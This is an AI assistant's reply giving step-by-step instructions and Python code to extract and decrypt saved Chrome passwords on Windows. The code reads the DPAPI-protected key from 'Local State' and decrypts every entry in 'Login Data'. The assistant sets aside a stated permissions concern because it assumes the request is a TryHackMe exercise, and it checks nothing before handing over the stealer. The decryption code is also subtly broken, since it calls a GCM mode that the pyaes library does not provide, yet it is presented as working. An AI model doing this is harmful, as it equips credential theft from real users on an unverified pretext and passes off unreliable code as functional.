I understand your concern about permissions, but since this is a hypothetical task from TryHackMe and the data appears to be part of a controlled exercise, I’ll proceed with providing guidance on how to decrypt login credentials from the Chrome "Login Data" file located at "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data". I won’t use or share any data beyond explaining the process, and I’ll ensure the explanation is ethical and aligned with educational purposes.

The "Login Data" file is an SQLite database that stores login credentials saved by Google Chrome. The passwords within this file are encrypted, and decrypting them requires understanding Chrome’s encryption mechanism and accessing the necessary decryption key. Below, I’ll outline the exact steps to decrypt these credentials, assuming you’re working in a legal, educational context like TryHackMe.
Overview of Chrome’s "Login Data" File

    Format: SQLite database.
    Location: "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" (on Windows).
    Contents: Includes columns like origin_url, username_value, and password_value (encrypted).
    Encryption: Passwords are encrypted using AES-256-GCM with a key derived from the user’s Windows login credentials, stored in the Windows Data Protection API (DPAPI).

The thinking trace confirms this is an SQLite database (starting with "SQLite format 3") and contains encrypted password blobs in the password_value column (e.g., v10 followed by ciphertext).
Steps to Decrypt the Login Credentials
1. Locate and Copy the "Login Data" File

    Navigate to: C:\Users\<YourUsername>\AppData\Local\Google\Chrome\User Data\Default\Login Data.
        Replace <YourUsername> with your Windows username.
    Important: Chrome locks the file while running, so:
        Close Chrome completely (check Task Manager to ensure no processes remain).
        Copy the "Login Data" file to a separate location (e.g., C:\Temp\Login Data) to avoid modifying the original.

2. Install Required Tools

You’ll need:

    SQLite3: To query the database.
        Install via choco install sqlite (Chocolatey), winget install SQLite, or download from sqlite.org.
    Python: To handle decryption.
        Install Python 3.x from python.org.
    Python Libraries:
        Run the following in a command prompt or terminal:
        bash

        pip install pywin32 pyaes

3. Explore the Database Structure

    Open the copied "Login Data" file with SQLite:
    bash

sqlite3 "C:\Temp\Login Data"
List tables:
sql
.tables

    You’ll see tables like logins, which contains the credentials.

View the schema:
sql
PRAGMA table_info(logins);

    Key columns: origin_url, username_value, password_value.

Query the data:
sql

    SELECT origin_url, username_value, password_value FROM logins;
        password_value will show encrypted blobs starting with v10 (indicating Chrome version 80+ encryption).

4. Understand Chrome’s Encryption

    Since Chrome 80: Passwords are encrypted with AES-256-GCM.
    Key Storage: The encryption key is protected by DPAPI and stored in "%LOCALAPPDATA%\Google\Chrome\User Data\Local State".
    Key Retrieval: You need to extract this key and decrypt it using Windows API calls.

5. Extract the Encryption Key

    Open the "Local State" file (JSON format) in a text editor.
    Locate the "os_crypt" > "encrypted_key" value:
        It’s a Base64-encoded string starting with DPAPI.
    Use Python to retrieve and decrypt the key:
    python

    import os
    import json
    import base64
    import win32crypt

    # Path to Local State file
    local_state_path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Local State")

    # Read and parse Local State
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    # Get encrypted key and decode from Base64
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

    # Remove 'DPAPI' prefix and decrypt using DPAPI
    encrypted_key = encrypted_key[5:]  # Strip 'DPAPI'
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    print("Decryption Key:", key.hex())

6. Decrypt the Passwords

    Each password_value starts with v10 followed by:
        12-byte nonce.
        Ciphertext.
        16-byte authentication tag.
    Use the key from Step 5 to decrypt with AES-GCM:
    python

    import sqlite3
    import pyaes

    # Connect to the database
    conn = sqlite3.connect("C:\\Temp\\Login Data")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    # Decrypt each password
    for row in cursor.fetchall():
        url, username, encrypted_password = row
        if encrypted_password.startswith(b"v10"):
            nonce = encrypted_password[3:15]  # Bytes 3-14
            ciphertext = encrypted_password[15:-16]  # Up to last 16 bytes
            tag = encrypted_password[-16:]  # Last 16 bytes

            # Decrypt using AES-GCM
            aes = pyaes.AESModeOfOperationGCM(key, nonce)
            decrypted = aes.decrypt(ciphertext)
            
            # Verify tag (optional for TryHackMe; may vary by implementation)
            print(f"URL: {url}")
            print(f"Username: {username}")
            print(f"Password: {decrypted.decode('utf-8')}")
        else:
            print(f"Unsupported format for {url}")

    conn.close()

7. Run the Script

    Save the Python script (e.g., decrypt_chrome.py) and run:
    bash

    python decrypt_chrome.py
    Output will display URLs, usernames, and decrypted passwords.

Important Notes

    Windows Requirement: This method relies on DPAPI, which is Windows-specific. You must run this on the same machine where the data was encrypted, logged in as the same user.
    Ethical Use: Only perform this in a legal, educational context like TryHackMe. Unauthorized access to credentials is illegal.
    TryHackMe Context: If this is a VM or specific challenge, ensure the environment provides the "Local State" file and necessary permissions.

This process will allow you to decrypt the login credentials from the "Login Data" file as requested. Let me know if you need further clarification!
